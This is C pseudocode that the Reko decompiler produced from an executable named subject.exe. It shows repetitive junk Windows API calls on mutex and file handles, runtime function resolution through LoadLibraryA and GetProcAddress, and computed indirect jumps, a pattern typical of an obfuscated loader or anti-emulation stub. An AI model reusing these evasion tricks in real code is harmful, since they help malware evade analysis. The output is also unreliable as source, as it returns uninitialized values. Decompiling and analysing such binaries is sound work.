// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401010: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	Eq_3 eax_14 = OpenMutexA(0x001F0001, 0x00, &globals->t433732);
	CloseHandle(eax_14);
	GetFileType(eax_14);
	CloseHandle(eax_14);
	CloseHandle(eax_14);
	ptr32 esp_29 = fp - 116;
l0040104F:
	LPDWORD * esp_57 = esp_29 - 0x04;
	*esp_57 = (LPDWORD *) null;
	*(esp_57 - 0x04) = (HANDLE *) eax_14;
	GetFileSize(*(esp_57 - 0x04), *esp_57);
	*(esp_57 - 0x08) = (HANDLE *) eax_14;
	GetFileType(*(esp_57 - 0x08));
	*(esp_57 - 0x0C) = 4404911;
	*(esp_57 - 0x10) = 0x01;
	*(esp_57 - 0x14) = 0x001F0001;
	ptr32 esp_255 = esp_57 - 0x14;
	Eq_3 eax_73 = OpenMutexA(*(esp_57 - 0x14), *(esp_57 - 0x10), *(esp_57 - 0x0C));
	do
	{
		LPCSTR * esp_84 = esp_255 - 0x04;
		*esp_84 = (LPCSTR *) &globals->t433749;
		*(esp_84 - 0x04) = 0x00;
		*(esp_84 - 0x08) = 0x001F0001;
		esp_29 = esp_84 - 0x08;
		Eq_3 eax_90 = OpenMutexA(*(esp_84 - 0x08), *(esp_84 - 0x04), *esp_84);
		if (eax_90 != null)
			goto l0040104F;
		*(esp_84 - 0x0C) = 4405081;
		*(esp_84 - 0x10) = 0x01;
		*(esp_84 - 0x14) = 0x001F0001;
		Eq_3 eax_101 = OpenMutexA(*(esp_84 - 0x14), *(esp_84 - 0x10), *(esp_84 - 0x0C));
		if (eax_101 != null)
		{
			*(esp_84 - 0x18) = 0x00;
			*(esp_84 - 0x1C) = (HANDLE *) dwLoc4C;
			CloseHandle(*(esp_84 - 0x1C));
			*(esp_84 - 0x20) = dwLoc20;
			GetFileType(*(esp_84 - 0x20));
			ExitProcess(*(esp_84 - 0x20));
		}
		ptr32 esp_162;
		*(esp_84 - 0x18) = (HANDLE *) eax_14;
		CloseHandle(*(esp_84 - 0x18));
		*(esp_84 - 0x1C) = 0x00;
		*(esp_84 - 0x20) = (HANDLE *) eax_101;
		GetFileSize(*(esp_84 - 0x20), *(esp_84 - 0x1C));
		*(esp_84 - 0x24) = 0x00;
		*(esp_84 - 0x28) = (HANDLE *) eax_14;
		GetFileSize(*(esp_84 - 0x28), *(esp_84 - 0x24));
		*(esp_84 - 44) = (HANDLE *) eax_73;
		CloseHandle(*(esp_84 - 44));
		*(esp_84 - 0x30) = (HANDLE *) eax_73;
		GetFileType(*(esp_84 - 0x30));
		*(esp_84 - 0x34) = 4405025;
		*(esp_84 - 0x38) = 0x01;
		*(esp_84 - 0x3C) = 0x001F0001;
		Eq_3 eax_137 = OpenMutexA(*(esp_84 - 0x3C), *(esp_84 - 0x38), *(esp_84 - 0x34));
		if (eax_137 != null)
		{
			*(esp_84 - 0x40) = dwLoc20;
			GetFileType(*(esp_84 - 0x40));
			dwLoc40 = dwLoc40 + 0x0042D027;
			esp_162 = esp_84 - 0x40;
l00401386:
			HANDLE * esp_165 = esp_162 - 0x04;
			*esp_165 = (HANDLE *) dwLoc0C;
			CloseHandle(*esp_165);
			*(esp_165 - 0x04) = (HANDLE *) dwLoc2C;
			GetFileType(*(esp_165 - 0x04));
			*(esp_165 - 0x08) = 0x00;
			*(esp_165 - 0x0C) = (HANDLE *) dwLoc1C;
			Eq_2 eax_180 = GetFileSize(*(esp_165 - 0x0C), *(esp_165 - 0x08));
			word32 esp_184;
			word32 ebp_185;
			byte SCZO_186;
			Eq_2 eax_187;
			byte SZO_188;
			byte C_189;
			byte Z_190;
			(dwLoc40 - 0x004013C8)();
			return eax_187;
		}
		*(esp_84 - 0x40) = 4405032;
		*(esp_84 - 0x44) = 4404971;
		*(esp_84 - 0x48) = 0x00;
		*(esp_84 - 0x4C) = 0x001F0001;
		Eq_3 eax_202 = OpenMutexA(*(esp_84 - 0x4C), *(esp_84 - 0x48), *(esp_84 - 0x44));
		esp_162 = esp_84 - 0x4C;
		dwLoc2C = eax_202;
		if (eax_202 != null)
			goto l00401386;
		Eq_422 eax_208 = LoadLibraryA(*(esp_84 - 0x4C));
		*(esp_84 - 0x50) = 4404901;
		*(esp_84 - 0x54) = 0x01;
		*(esp_84 - 88) = 0x001F0001;
		dwLoc1C = OpenMutexA(*(esp_84 - 88), *(esp_84 - 0x54), *(esp_84 - 0x50));
		*(esp_84 - 0x5C) = 4405110;
		*(esp_84 - 0x60) = (HANDLE *) eax_137;
		CloseHandle(*(esp_84 - 0x60));
		*(esp_84 - 100) = (HMODULE *) eax_208;
		Eq_490 eax_227 = GetProcAddress(*(esp_84 - 100), *(esp_84 - 0x60));
		*(esp_84 - 0x68) = 4404922;
		*(esp_84 - 0x6C) = 0x00;
		*(esp_84 - 0x70) = 0x001F0001;
		Eq_3 eax_235 = OpenMutexA(*(esp_84 - 0x70), *(esp_84 - 0x6C), *(esp_84 - 0x68));
		*(esp_84 - 116) = 0x00;
		*(esp_84 - 0x78) = (HANDLE *) eax_73;
		GetFileSize(*(esp_84 - 0x78), *(esp_84 - 116));
		*(esp_84 - 0x7C) = (HANDLE *) eax_90;
		CloseHandle(*(esp_84 - 0x7C));
		*(esp_84 - 0x80) = (HANDLE *) eax_101;
		CloseHandle(*(esp_84 - 0x80));
		*(esp_84 - 0x84) = 4405008;
		*(esp_84 - 0x88) = 0x01;
		*(esp_84 - 0x8C) = 0x001F0001;
		Eq_3 eax_257 = OpenMutexA(*(esp_84 - 0x8C), *(esp_84 - 0x88), *(esp_84 - 0x84));
		esp_255 = esp_84 - 0x8C;
		dwLoc4C = eax_257;
	} while (eax_257 != null);
	*(esp_84 - 0x90) = 0x00;
	*(esp_84 - 0x94) = (HANDLE *) eax_73;
	GetFileSize(*(esp_84 - 0x94), *(esp_84 - 0x90));
	*(esp_84 - 0x98) = (HANDLE *) eax_202;
	GetFileType(*(esp_84 - 0x98));
	*(esp_84 - 0x9C) = 4405002;
	*(esp_84 - 0xA0) = 0x01;
	*(esp_84 - 0xA4) = 0x001F0001;
	OpenMutexA(*(esp_84 - 0xA4), *(esp_84 - 0xA0), *(esp_84 - 0x9C));
	*(esp_84 - 0xA8) = 0x00;
	*(esp_84 - 0xAC) = (HANDLE *) eax_257;
	GetFileType(*(esp_84 - 0xAC));
	*(esp_84 - 0xB0) = 0x00;
	*(esp_84 - 0xB4) = (HANDLE *) eax_202;
	GetFileSize(*(esp_84 - 0xB4), *(esp_84 - 0xB0));
	*(esp_84 - 0xB8) = 0x00;
	*(esp_84 - 188) = 0x00;
	*(esp_84 - 0xC0) = (HANDLE *) eax_90;
	GetFileType(*(esp_84 - 0xC0));
	do
	{
		int32 eax_303 = eax_227();
		*(esp_84 - 0xC4) = 0x00;
		*(esp_84 - 200) = (HANDLE *) eax_73;
		GetFileSize(*(esp_84 - 200), *(esp_84 - 0xC4));
		*(esp_84 - 0xCC) = (HANDLE *) eax_90;
		CloseHandle(*(esp_84 - 0xCC));
		*(esp_84 - 0xD0) = (HANDLE *) eax_235;
		CloseHandle(*(esp_84 - 0xD0));
		*(esp_84 - 212) = 4404954;
		*(esp_84 - 0xD8) = 0x01;
		*(esp_84 - 220) = 0x001F0001;
	} while (OpenMutexA(*(esp_84 - 220), *(esp_84 - 0xD8), *(esp_84 - 212)) != null);
	word32 esp_342;
	word32 ebp_343;
	byte SCZO_344;
	Eq_2 eax_345;
	byte SZO_346;
	byte C_347;
	byte Z_348;
	(*((word32) (eax_303 ^ 0x80070057) + 0x00401271))();
	return eax_345;
}

